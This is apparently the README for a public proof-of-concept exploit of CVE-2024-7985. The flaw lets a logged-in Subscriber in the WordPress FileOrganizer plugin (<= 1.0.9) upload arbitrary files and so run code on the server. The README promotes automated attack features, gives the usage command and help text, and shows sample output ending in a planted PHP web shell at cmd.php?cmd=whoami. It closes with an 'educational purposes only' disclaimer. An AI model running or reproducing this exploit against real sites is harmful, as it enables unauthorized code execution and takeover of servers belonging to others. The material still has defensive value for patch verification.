# CVE-2024-7985-PoC
FileOrganizer &lt;= 1.0.9 - Authenticated (Subscriber+) Arbitrary File Upload

# FileOrganizer Exploit - CVE-2024-7985

## 📌 Overview
**CVE-2024-7985** - WordPress Plugin **FileOrganizer <= 1.0.9** is vulnerable to **authenticated arbitrary file uploads**, allowing attackers with **Subscriber+** privileges to upload and execute malicious files remotely. This vulnerability arises from **missing file type validation** in the `fileorganizer_ajax_handler` function, making **Remote Code Execution (RCE) possible**.

🚨 **This exploit allows attackers to execute arbitrary commands on the server!** 🚨

## ⚡ Features
- ✅ **Automates the attack** - Login, retrieve nonce, exploit.
- ✅ **Bypasses security checks** by utilizing authenticated user privileges.
- ✅ **Automatic version detection** - Ensures the target is vulnerable.
- ✅ **Custom command execution** - User can specify any command.
- ✅ **Handles SSL verification issues** seamlessly.

## 🛠️ Requirements
- **Python 3**
- `requests`
- `beautifulsoup4`

Install dependencies:
```bash
pip install requests beautifulsoup4
```

## 🚀 Usage
```bash
python CVE-2024-7985.py --url "http://target-site.com/wordpress" --username "admin" --password "admin" --cmd "whoami"
```

## 📖 Usage -Help
```
usage: CVE-2024-7985.py [-h] --url URL --username USERNAME --password PASSWORD [--cmd CMD]

FileOrganizer <= 1.0.9 - Authenticated (Subscriber+) Arbitrary File Upload by | Nxploit Khaled_alenazi

options:
  -h, --help           show this help message and exit
  --url URL            Target WordPress site URL
  --username USERNAME  WordPress Username
  --password PASSWORD  WordPress Password
  --cmd CMD            Command to execute in uploaded file
```



### Example Output:
```
[+] Vulnerable version detected: 1.0.9
[+] Logged in successfully!
[+] Extracted nonce: 7b4a95872b
[+] File uploaded successfully!
[+] Access file at: http://target-site.com/wordpress/wp-content/uploads/fileorganizer/cmd.php?cmd=whoami
```

## 🔍 Exploit Workflow
1️⃣ **Version Check** - Determines if the site is vulnerable.  
2️⃣ **Authentication** - Logs into WordPress.  
3️⃣ **Nonce Extraction** - Retrieves security token.  
4️⃣ **File Upload** - Uploads a malicious PHP script.  
5️⃣ **Command Execution** - Executes user-specified commands.  

---

### 📌 Disclaimer 
This script is for educational purposes only; the author holds no responsibility for any misuse or consequences. 🚨
